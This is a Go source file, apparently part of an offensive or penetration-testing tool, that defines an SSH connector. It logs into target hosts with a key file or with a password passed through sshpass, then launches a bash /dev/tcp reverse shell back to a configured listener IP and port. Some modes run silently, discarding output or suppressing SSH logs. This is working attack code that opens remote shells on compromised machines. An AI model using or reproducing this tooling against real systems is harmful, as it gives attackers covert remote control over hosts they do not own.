package internal

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

// SSHConnector handles SSH connections with automatic reverse shell
type SSHConnector struct {
	ListenerIP   string
	ListenerPort int
	lookPath     func(string) (string, error)
}

// NewSSHConnector creates a new SSH connector
func NewSSHConnector(ip string, port int) *SSHConnector {
	return &SSHConnector{
		ListenerIP:   ip,
		ListenerPort: port,
		lookPath:     exec.LookPath,
	}
}

func (s *SSHConnector) buildCommand(args SSHArgs) (*exec.Cmd, error) {
	payload := s.generatePayload()
	baseArgs := []string{"-T", "-o", "StrictHostKeyChecking=accept-new", "-p", strconv.Itoa(args.Port)}

	if args.KeyPath != "" {
		sshArgs := append(baseArgs, "-i", args.KeyPath, args.Target, payload)
		return exec.Command("ssh", sshArgs...), nil
	}

	if _, err := s.lookPath("sshpass"); err != nil {
		return nil, fmt.Errorf("sshpass not found in PATH")
	}
	sshArgs := append([]string{"-e", "ssh"}, append(baseArgs, args.Target, payload)...)
	cmd := exec.Command("sshpass", sshArgs...)
	cmd.Env = append(os.Environ(), "SSHPASS="+args.Password)
	return cmd, nil
}

func (s *SSHConnector) ConnectBackground(args SSHArgs) error {
	cmd, err := s.buildCommand(args)
	if err != nil {
		return err
	}
	cmd.Stdin = nil
	cmd.Stdout = io.Discard
	cmd.Stderr = io.Discard
	return cmd.Start()
}

// Connect establishes SSH connection and executes reverse shell payload
// Format: ssh user@host or ssh user@host:port
func (s *SSHConnector) Connect(target string) error {
	// Parse target: user@host or user@host:port
	parts := strings.Split(target, "@")
	if len(parts) != 2 {
		return fmt.Errorf("invalid SSH target format. Use: user@host or user@host:port")
	}

	user := parts[0]
	hostAndPort := parts[1]

	// Check if port is specified
	sshTarget := fmt.Sprintf("%s@%s", user, hostAndPort)

	// Generate the reverse shell payload
	payload := s.generatePayload()

	// Build SSH command
	// ssh -t forces pseudo-terminal allocation (needed for interactive shells)
	// We execute the payload directly
	sshCmd := exec.Command("ssh", "-t", "-o", "StrictHostKeyChecking=accept-new", sshTarget, payload)

	// Connect stdin/stdout/stderr to allow interaction
	sshCmd.Stdin = os.Stdin
	sshCmd.Stdout = os.Stdout
	sshCmd.Stderr = os.Stderr

	// Execute SSH command
	fmt.Printf("Connecting to %s...\n", sshTarget)
	fmt.Printf("Executing reverse shell payload to %s:%d\n", s.ListenerIP, s.ListenerPort)

	err := sshCmd.Run()
	if err != nil {
		return fmt.Errorf("SSH connection failed: %w", err)
	}

	return nil
}

// generatePayload creates the bash reverse shell payload
func (s *SSHConnector) generatePayload() string {
	// Use bash reverse shell that connects back to the listener
	// This runs in the background and exits immediately
	payload := fmt.Sprintf(
		"bash -c 'exec bash >& /dev/tcp/%s/%d 0>&1 &' && exit",
		s.ListenerIP,
		s.ListenerPort,
	)
	return payload
}

// ConnectInteractive performs silent SSH connection
func (s *SSHConnector) ConnectInteractive(target string) error {
	// Parse target
	parts := strings.Split(target, "@")
	if len(parts) != 2 {
		return fmt.Errorf("invalid SSH target format. Use: user@host or user@host:port")
	}

	user := parts[0]
	hostAndPort := parts[1]
	sshTarget := fmt.Sprintf("%s@%s", user, hostAndPort)

	// Generate payload
	payload := s.generatePayload()

	// Build and execute SSH command silently
	// -T: disable pseudo-terminal allocation (no banner)
	// -o StrictHostKeyChecking=no: auto-accept host keys (optional, for convenience)
	// -o LogLevel=ERROR: suppress SSH messages
	sshCmd := exec.Command("ssh", "-T", "-o", "StrictHostKeyChecking=accept-new", "-o", "LogLevel=ERROR", sshTarget, payload)
	sshCmd.Stdin = os.Stdin
	sshCmd.Stdout = os.Stdout
	sshCmd.Stderr = os.Stderr

	err := sshCmd.Run()
	if err != nil {
		return fmt.Errorf("SSH connection failed: %w", err)
	}

	return nil
}
